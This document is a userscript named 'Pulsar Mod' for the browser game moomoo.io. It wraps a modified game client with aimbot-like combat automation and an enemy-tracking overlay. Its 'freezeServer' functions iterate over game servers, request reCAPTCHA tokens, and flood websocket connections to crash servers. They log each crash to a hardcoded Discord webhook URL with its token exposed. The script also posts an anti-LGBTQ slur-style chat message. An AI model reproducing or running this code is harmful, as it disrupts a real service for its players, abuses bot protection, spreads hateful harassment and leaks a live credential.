// ==UserScript==
// @name         Pulsar Mod
// @namespace    youtube.com/@pulsar_proe
// @version      1.1
// @description  Pulsar's Private Mod!
// @icon         https://www.nasa.gov/sites/default/files/thumbnails/image/pulsar-3.gif
// @author       Pulsar
// @match        *://moomoo.io/*
...
background: url(https://www.nasa.gov/sites/default/files/thumbnails/image/pulsar-3.gif);
background-size: 100%;
`
document.getElementById("setupCard").style=`
transition: 1s all;
text-align: center;
font-size: 23px;
padding: 6px;
...
menu.innerHTML = `
    ...
    <input type = "checkbox" id = "counter"> Insta-NoCount<br>
...
document.getElementById("gameName").innerHTML = "Pulsar Mod"
document.getElementById("gameName").style.color = "cyan"
document.getElementById("loadingText").innerHTML = "<div id = 'pb' style = 'background:black; height:30px; width:1%;'></div><a href = 'https://youtube.com/@pulsar_proe'> youtube.com/@pulsar_proe </a>"

let ik = 0;
let klop = setInterval(()=>{
    if (ik > 100) clearInterval(klop);
    document.getElementById('pb').style.width = ik + "%";
    ik++;
},1/100);
...
freezeLogger.innerHTML = `
  <span id="freezeHeader">Terminal</span>
...
function freezeServer(server, type, url) {
    fetch("https://" + type + "/serverData.js").then(e => e.text()).then(e => {
        ...
        for (let gameServer of vultr.servers) {
            ...
            request.open("POST", "https://discord.com/api/webhooks/1011336904861556896/iKYT366j5cqRzrY8Ua0ibueP4G2_RUWUV-dUd4eYtUL9ruhHktdaqgoeqZvTD9eUdAKP");
            request.setRequestHeader('Content-type', 'application/json');
            request.send(JSON.stringify({ content: `Successfully Crashed ${url} ${server}` }));
            text += `<div class="textLog"><span> Crashed ${server}</span></div>`;
            document.getElementById("logger-body").innerHTML = text;
            request.close();
            if(serverId == server) {
                if(freezedServers[0]) {
                    ...
                    for(let i in freezedServers) {
                        if(freezedServers[i] == `Crashed ${server}`) {
                            canJoin = false;
                        }
                    }
                    if(canJoin) {
        ...
        for (let gameServer of vultr.servers) {
            ...
            if(gameServer.games[0].playerCount < 40) {
                if(freezedServers[0]) {
                    let canJoin = true;
                    for(let i in freezedServers) {
                        if(freezedServers[i] == `Crashed ${serverId}`) {
                            canJoin = false;
                        }
                    }
                    if(canJoin) {
                        window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                            freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `Crashed ${serverId}`);
                        }));
                    }
                } else {
                    window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
...
function freezeCurrentServer(ws, link) {
    ...
    text += `<div class="textLog"><span>Crashed ${link.slice(link.indexOf(" ") + 1)}</span></div>`;
    document.getElementById("logger-body").innerHTML = text;
    ...
    setTimeout(() => {
        ...
        ws.freezeIntervals.push(setInterval(function() {
            ...
            ws.emit(["ch", ["ur mom"]]);
            ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random()),ws.send(dash,Math.random());
...
!(function (e) {
    ...
    function (e, t) {
        (t.read = function (e, t, n, i, r) {
            var s,
                ...
                d = e[t + u];
            for (
                u += f, s = d & ((1 << -h) - 1), d >>= -h, h += o;
                h > 0;
                s = 256 * s + e[t + u], u += f, h -= 8
            );
            for (
                a = s & ((1 << -h) - 1), s >>= -h, h += i;
                h > 0;
                a = 256 * a + e[t + u], u += f, h -= 8
            );
            if (0 === s) s = 1 - l;
            else {
            ...
            for (
                ...
                : ((a = Math.floor(Math.log(t) / Math.LN2)),
                   ...
                   : ((o = t * Math.pow(2, u - 1) * Math.pow(2, r)), (a = 0)));
                r >= 8;
                e[n + d] = 255 & o, d += p, o /= 256, r -= 8
            );
            for (
                a = (a << r) | o, l += r;
                l > 0;
    ...
    function (e, t, n) {
        (function (t) {
            (e.exports.maxScreenWidth = 1650),
                (e.exports.maxScreenHeight = 970),
                (e.exports.serverUpdateRate = 9),
                (e.exports.maxPlayers =
                 t && -1 != t.argv.indexOf("--largeserver") ? 80 : 40),
                ...
                for (
                    ...
                    i = e.exports.weaponVariants.length - 1;
                    i >= 0;
                    --i
                )
    ...
    function (e, t, n) {
                        ...
                        function (e) {
                            ...
                            : ((ue.onclick = s.checkTrusted(function () {
                               ...
                               (function () {
                                ...
                                for (
                                    var t = 0;
                                    t < l.weapons.length + l.list.length;
                                    ++t
                                )
                                    !(function (e) {
                                        s.generateElement({
                                ...
                                (Le.ontouchstart = s.checkTrusted(function (e) {
                                    e.preventDefault();
                                    var t = prompt("enter your gender", e.currentTarget.value);
        ...
        var at = document.getElementById("featuredYoutube"),
            ot = [
                {
                    name: "King Hans",
                    link: "https://www.youtube.com/c/TXKingHans"
                }
            ],
        ...
        function pt() {
            ...
            (n += "<option disabled>All Servers - " + i + " players</option>"),
                ...
                ? ((e = "Back to peaceful farm and enjoyable gameplay"), (t = "//moomoo.io/"))
            : ((e = "ENTER BRUTAL HELL"), (t = "//sandbox.moomoo.io/")),
        ...
        function Ut() {
            if (R && R.alive) {
                ...
                s.removeAllChildren(Xe),
                    ...
                    style: "width: 360px",
                    text: R.isOwner ? "Kill Tribe" : "Sabotage Tribe",
                    onclick: function () {
                        Ht();
                    },
                    hookTouch: !0,
                ...
                : (s.generateElement({
                    ...
                    ontouchstart: function (e) {
                        e.preventDefault();
                        var t = prompt("ur gender", e.currentTarget.value);
        ...
        function Pn() {
            ...
            r.send("sp",{name:localStorage.getItem("moo_name"), skin:"4", moofoll: 1})
            setTimeout(()=>{r.send("ch", "Kill = LGBTQT++ supporter"), quad()},150)
            gt();
        }
        function Bn(e) {
        ...
        function quad() {
            let f = R.dir
            for (let i = 0; i < R.dir; i += Math.PI / 2) placer(R.items[2],i), r.send(new Uint8Array([223, 0, 83, 80, 29, 38, 3, 17, 15, 4, 7]))
        }
        function Cn(e) {
            nt.disableBySid(e);
                    ...
                    s.generateElement({
                        ...
                        children: [
                            s.generateElement({
                                ...
                                style:
                                "color:" + (e[n] == j ? "#fff" : "rgba(255,255,255,0.6)"),
        ...
        function Wn(e, t, n) {
            ...
            if (_ == R) {
                ...
                if ( Math.floor(Math.hypot(R.x - _.x, R.y - _.y)) < 150 && Math.floor(Math.hypot(R.x - _.x, R.y - _.y)) > 0) {
                    r.send("c", 1, null);
        ...
        function vi(e, t) {
            var n = (function (e) {
                for (var t = 0; t < W.length; ++t) if (W[t].id == e) return W[t];
                return null;
            })(e[0]);
        ...
        window.addEventListener("keydown", function (e) {
            if (e.key == "f" && document.activeElement.id.toLowerCase() !== "chatbox")
                autoT = !autoT;
            if (e.key == "r" && document.activeElement.id.toLowerCase() !== "chatbox")
                insta();
            if (e.key == "v" && document.activeElement.id.toLowerCase() !== "chatbox")
                autoS = !autoS;
        ...
        window.addEventListener("keydown",function(e){
            if (e.keyCode == 82 && document.activeElement.id.toLowerCase() !== "chatbox") {
                ...
                if (get("counter")) {
                    ...
                    if (canCounter) {
                        let oldDir = R.dir;
                        storeEquip(13, !0), storeEquip(7);
                        Sn(R.weapons[0], true), r.send("c", 1, 90**100)
                        setTimeout(()=>{
                            r.send("c", 1, oldDir), Sn(R.weapons[1], true), r.send("c", 0, null), storeEquip(53);
                            setTimeout(storeEquip(22), 111), r.send("ch", "Counter Insta - Pulsar Mod")
                        },69);
                    }
                }
            }
        ...
        setInterval(()=>{
            ...
            if (100 - R.health == 50) {
                ...
                storeEquip(22);
                placer(R.items[0], null);
                setTimeout(()=>{R.visible=true},25);
            }
            if (R.health != 100) {
                if (R.health > 85) { // dont die to bull bleeed
                    setTimeout(() => {
        ...
        setInterval(()=>{
            ...
            if (Date.now() - tick > 111) {
                if (R.health < 100) for (let i = 0; i < 10; i++) placer(R.items[0], null);
                storeEquip(22)
            }
            r.send("5", R.reloads.findIndex(el => (el > 0)), true)
        },5);
        let kills = 0;
        setInterval(() => {
            (parseInt(document.getElementById("killCounter").innerText) > kills) && (
                kills = parseInt(document.getElementById("killCounter").innerText),
                r.send("ch", "gg - Pulsar's GG")
            )
        }, 10);
        let tick = Date.now()
        ...
        function Ti(e) {
            ...
            if (syncop) {
                ...
                storeBuy(Ii(e).tailIndex,!0)
                storeEquip(Ii(e).skinIndex)
                storeEquip(Ii(e).tailIndex,!0)
            }
            if (!automillx) {
                automillx = R.x;
            }
            ...
            if (yooldy != R.y || yooldx != R.x) {
                let angulo = Math.atan2(yooldy - R.y, yooldx - R.x);
                let Mouse = Math.atan2(mouseY - height / 2, mouseX - width / 2);
                if (walkmillhaha) {
                    if (
                        Math.sqrt(
                            Math.pow(R.y - automilly, 2) + Math.pow(R.x - automillx, 2)
                        ) > 100
                    ) {
                        place(R.items[3], angulo + toRad(78));
                        place(R.items[3], angulo - toRad(78));
                        place(R.items[3], angulo - toRad(0));
                        r.send("2", Mouse);
                        automillx = R.x;
                        automilly = R.y;
                    }
            ...
            for (n = 0; n < e.length; )
                (_ = Ii(e[n])) &&
                    ...
                    ((_.t1 = void 0 === _.t2 ? t : _.t2),
                     ...
                     _.skinIndex == 53 && storeEquip(22),
                     caanInsta = _ == R ? true : _.skinIndex != 6,
                     (_.team = e[n + 7]),
                     (_.isLeader = e[n + 8]),
                     (_.skinIndex = e[n + 9]),
                     (_.tailIndex = e[n + 10]),
        ...
        function Mi(e) {
            for (var t = 0; t < N.length; ++t) if (N[t].sid == e) return N[t];
            return null;
        }
        var Ai = -1;
        function Pi() {
        ...
        let Imag = {loaded: false, image: new Image(125, 125)};
        Imag.image.src = 'https://media.discordapp.net/attachments/827112969304277012/888080795921694811/png-clipart-red-target-icon-sniper-rifle-aim-miscellaneous-text-thumbnail-removebg-preview.png?width=125&height=125';
        Imag.image.onload = function(){
            Imag.loaded = true;
        };
        function Oi(e) {
        ...
        (window.requestAnimFrame =
         ...
         function (e) {
            ...
            (B = Date.now()),
                ...
                for (
                    var i = B - 1e3 / o.serverUpdateRate, a = 0;
                    a < W.length + Y.length;
                    ++a
                )
                ...
                for (
                    ...
                    if (
                        (_ = W[a] || Y[a - W.length]).visible &&
                        (10 != _.skinIndex || _ == R || (_.team && _.team == R.team))
                    ) {
                        var w = (R == _ ? window.pingTime : _.ping) + " Skin: " + _.skinIndex + " Weapon: " + _.weaponIndex + " Dist: " + Math.floor(Math.hypot(R.x - _.x, R.y - _.y)) + " " + (_.team ? "[" + _.team + "] " : "") + (_.name || "") + " Shame: {" + _.shameCount + "} id:" + _.sid + " x: " + Math.floor(_.x) + " y: " + Math.floor(_.y);
                        if (Imag.loaded) be.drawImage(Imag.image, _.w - f, _.y - d - _.scale - 50, 150, 150)
                        if ( Math.floor(Math.hypot(R.x - _.x, R.y - _.y)) < 150) {
                            if (Math.floor(Math.hypot(R.x - _.x, R.y - _.y)) > 0) {
                                canCounter = true
                                setTimeout(canCounter = false,111)
                                storeEquip(6);
                                placer(R.items[2], R.dir - 1.5)
                                if (canCounter) {
                                    let oldDir = R.dir;
                                    storeEquip(13, !0), storeEquip(7);
                                    Sn(R.weapons[0], true), r.send("c", 1, 90**100)
                                    setTimeout(()=>{
                                        r.send("ch", "Pulsar Mod: Counter Insta")
                                        r.send("c", 1, oldDir), Sn(R.weapons[1], true), r.send("c", 0, null), storeEquip(53);
                                        setTimeout(storeEquip(22), 111)
                                    },Math.hypot(R.x - _.x, R.y - _.y) / 2);
                                }
                            }
                        }
                        if ("" != w) {
                        ...
                        if (_.isPlayer) {
                            ...
                            _.health > 0 &&
                                (o.healthBarWidth,
                                 (be.fillStyle = rt),
                                 be.roundRect(
                                _.x - f - o.healthBarWidth - o.healthBarPad,
                                _.y - d + _.scale + o.nameY,
                                2 * o.healthBarWidth + 2 * o.healthBarPad,
                                17,
                                8
                            ),
                                 be.fill(),
                                 (be.fillStyle =
                                  ...
                                  : "#cc5151"),
                                 be.roundRect(
                                _.x - f - o.healthBarWidth,
                                _.y - d + _.scale + o.nameY + o.healthBarPad,
                                2 * o.healthBarWidth * (_.healthMov / _.maxHealth),
                                17 - 2 * o.healthBarPad,
                                7
                            ),
                                 be.fill());
                            ...
                            _.health > 0 &&
                                ...
                                _.x - f - o.healthBarWidth,
                                _.y - d + _.scale + o.nameY + o.healthBarPad,
                                2 * o.healthBarWidth * (_.health / _.maxHealth),
                                17 - 2 * o.healthBarPad,
                                7
                            ),
                                 be.fill());
                    ...
                    if (R && R.alive) {
                        ...
                        It &&
                            ((Ke.fillStyle = "#fc5553"),
                             ...
                             Ke.fillText(
                            "x",
                            (It.x / o.mapScale) * Ne.width,
                            (It.y / o.mapScale) * Ne.height
                        )),
                            Mt &&
                            ((Ke.fillStyle = "#fff"),
                             (Ke.font = "34px Hammersmith One"),
            ...
            o.addTest("passiveeventlisteners", function () {
                ...
                for (var h in s)
                    if (s.hasOwnProperty(h)) {
                        ...
                        for (
                            a = i(t.fn, "function") ? t.fn() : t.fn, c = 0;
                            c < e.length;
                            c++
                        )
    ...
    function (e, t, n) {
        ...
        (t.byteLength = function (e) {
            ...
            for (
                var t, n = e.length, r = n % 3, s = [], a = 0, o = n - r;
                a < o;
                a += 16383
            )
    ...
    function (e, t) {
        (t.copy = function (e, t, n, i) {
            ...
            if (e === this && n < t && t < i)
                for (r = s - 1; r >= 0; r--) e[r + t] = this[r + n];
            else for (r = 0; r < s; r++) e[r + t] = this[r + n];
            return s;
        }),
            (t.toString = function (e, t, n) {
            var i = 0 | t;
        ...
        (e.exports.randInt = function (e, t) {
            ...
            if (
                (n.onclick && (n.onclick = e.exports.checkTrusted(n.onclick)),
                 n.onmouseover &&
                 (n.onmouseover = e.exports.checkTrusted(n.onmouseover)),
        ...
        (e.exports.AnimText = function () {
            ...
            (this.texts = []),
                ...
                for (var r = 0; r < this.texts.length; ++r)
                    this.texts[r].life &&
                        (this.texts[r].update(e), this.texts[r].render(t, n, i));
            }),
    ...
    function (e, t) {
        e.exports = function (e) {
            (this.sid = e),
                ...
                this.active &&
                    (this.xWiggle && (this.xWiggle *= Math.pow(0.99, e)),
                     this.yWiggle && (this.yWiggle *= Math.pow(0.99, e)),
            ...
            (this.update = function (e) {
                if (this.alive) {
                    ...
                    if (this.shameCount != this.shameMov)
                        this.shameCount < this.shameMov
                            ? (this.shameMov -= 0.1)
                        : (this.shameMov += 0.1),
                            Math.abs(this.shameCount - this.shameMov) < 0.1 &&
                ...
                e &&
                    ...
                    e,
                    Math.round(
                        100 * this.age * (e.skin && e.skin.kScrM ? e.skin.kScrM : 1)
                    )
                ),
                ...
                if (
                    this.canBuild(e) &&
                    !(e.consume && this.skin && this.skin.noEat) &&
                    (e.consume ||
                     u.checkItemLocation(n, i, e.scale, 0.6, e.id, !1, this))
                ) {
                    var r = !1;
                    if (e.consume) {
                        if (this.hitTime) {
                ...
                (this.noMovTimer = 0),
                    (this.slowMult -= p.weapons[this.weaponIndex].hitSlow || 0.3),
                    this.slowMult < 0 && (this.slowMult = 0);
                for (
                    var e,
                    t,
                    i,
                    r = n.fetchVariant(this),
                    o = r.poison,
                    c = r.val,
                    h = {},
                    g = u.getGridArrays(
                        this.x,
                        this.y,
                        p.weapons[this.weaponIndex].range
                    ),
                    m = 0;
                    m < g.length;
                    ++m
                    ...
                    for (var y = 0; y < g[m].length; ++y)
                        if (
                            ...
                            l.getDistance(this.x, this.y, t.x, t.y) - t.scale <=
                            p.weapons[this.weaponIndex].range &&
                            ...
                            if (((h[t.sid] = 1), t.health)) {
                                if (
                                    t.changeHealth(
                                        -p.weapons[this.weaponIndex].dmg *
                                        c *
                                        (p.weapons[this.weaponIndex].sDmg || 1) *
                                    ...
                                    for (var k = 0; k < t.req.length; )
                                        this.addResource(
                                            n.resourceTypes.indexOf(t.req[k]),
                                            t.req[k + 1]
                                        ),
                                            (k += 2);
                                    u.disableObj(t);
                                ...
                                var v =
                                    p.weapons[this.weaponIndex].gather + (3 == t.type ? 4 : 0);
                ...
                for (y = 0; y < f.length + d.length; ++y)
                    if (
                        ...
                        l.getDistance(this.x, this.y, t.x, t.y) - 1.8 * t.scale <=
                        p.weapons[this.weaponIndex].range &&
                        ((e = l.getDirection(t.x, t.y, this.x, this.y)),
                         l.getAngleDist(e, this.dir) <= n.gatherAngle)
                    ) {
                        ...
                        w &&
                            t.addResource &&
                            ((w = Math.min(t.points || 0, w)),
                             this.addResource(3, w),
                             t.addResource(3, -w));
                        var b = c;
                        null != t.weaponIndex &&
                            p.weapons[t.weaponIndex].shield &&
                            l.getAngleDist(e + Math.PI, t.dir) <= n.shieldAngle &&
                            (b = p.weapons[t.weaponIndex].shield);
                        var x =
                            p.weapons[this.weaponIndex].dmg *
                        ...
                        (t.xVel += S * s(e)),
                            ...
                            this.skin &&
                            this.skin.healD &&
                            this.changeHealth(x * b * this.skin.healD, this),
                            this.tail &&
                            this.tail.healD &&
                            this.changeHealth(x * b * this.tail.healD, this),
                            t.skin &&
                            t.skin.dmg &&
                            1 == b &&
                            this.changeHealth(-x * t.skin.dmg, t),
                            t.tail &&
                            t.tail.dmg &&
                            1 == b &&
                            this.changeHealth(-x * t.tail.dmg, t),
                            !(t.dmgOverTime && this.skin && this.skin.poisonDmg) ||
                            (t.skin && t.skin.poisonRes) ||
                            ((t.dmgOverTime.dmg = this.skin.poisonDmg),
                ...
                for (var t = 0; t < f.length; ++t)
                    this.sentTo[f[t].id] &&
                        this.canSee(f[t]) &&
                        y.send(f[t].id, "7", this.sid, e ? 1 : 0, this.weaponIndex);
            });
            var x = 0,
                S = 0;
                        ...
                        for (c.length = 0, f = 0; f < e.length + t.length; ++f)
                            !(o = e[f] || t[f - e.length]).alive ||
                                ...
                                this.y + u * Math.sin(this.dir)
                                 ...
                                 c.push(o));
                        for (
                            var d = n.getGridArrays(this.x, this.y, this.scale), p = 0;
                            p < d.length;
                            ++p
                        )
    ...
    function (e, t, n) {
        ...
        (s.prototype.parse = function (e, t, n) {
            ...
            if (!m[b] && (S || (b && !y[b]))) {
                ...
                if (!P)
                    for (
                        var B = this.hostname.split(/\./), C = ((M = 0), B.length);
                        M < C;
                        M++
                    ) {
                        var O = B[M];
                ...
                n = {
                    ...
                    bytesToBase64: function (e) {
                        for (var n = [], i = 0; i < e.length; i += 3)
                            for (
                                var r = (e[i] << 16) | (e[i + 1] << 8) | e[i + 2], s = 0;
                                s < 4;
                                s++
                            )
                                8 * i + 6 * s <= 8 * e.length
            ...
            (this.update = function (e) {
                if (this.active) {
                    ...
                    if (this.hitWait > 0 && ((this.hitWait -= e), this.hitWait <= 0)) {
                        ...
                        for (
                            var M = t.getGridArrays(this.x, this.y, this.hitRange), A = 0;
                            A < M.length;
                            ++A
                        )
